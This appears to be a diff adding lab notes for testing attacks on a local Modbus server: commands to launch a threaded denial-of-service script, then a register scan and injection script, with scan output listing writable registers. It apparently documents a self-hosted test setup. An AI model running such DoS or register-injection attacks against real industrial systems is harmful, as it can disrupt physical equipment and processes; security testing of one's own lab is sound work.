@@ -1,0 +1,42 @@
+This should be deleted!!!
+Check before starting dos attack
+ netstat -an | findstr :502 | findstr ESTABLISHED
+ Should be few only
+
+ Run dos attack
+ python src/modbus_dos_attack.py --target 127.0.0.1 --port 502 --attack all --threads 150 --duration 30
+
+ Check again
+  netstat -an | findstr :502 | findstr ESTABLISHED
+Our modbus, has autoreconnect (protection from this, but it still works)
+
+
+Recon inject attack
+
+python src/modbus_server.py --port 502
+
+python src/modbus_client.py --host 127.0.0.1 --port 502
+
+Scan phase
+python src/modbus_recon_inject.py --target 127.0.0.1 --port 502 --mode scan
+
+OUTPUT:
+[INFO] [RECON] Scanning registers on 127.0.0.1:502
+[INFO] [RECON] Testing addresses 0-1000...
+[INFO] [RECON] Scanning holding registers (FC 3)...
+[INFO] [RECON] Progress: 0/1000 addresses scanned
+[INFO] [RECON] Progress: 100/1000 addresses scanned
+[INFO] [RECON] Progress: 200/1000 addresses scanned
+
+[WARNING] [RECON] WRITABLE register found: 43
+[WARNING] [RECON] WRITABLE register found: 44
+[WARNING] [RECON] WRITABLE register found: 45
+[WARNING] [RECON] WRITABLE register found: 46
+[WARNING] [RECON] WRITABLE register found: 47
+[WARNING] [RECON] WRITABLE register found: 48
+[WARNING] [RECON] WRITABLE register found: 49
+[INFO] [RECON] Found 50 writable registers
+[WARNING] [RECON] Attack completed
+
+python src/modbus_recon_inject.py --target 127.0.0.1 --port 502 --mode inject
+
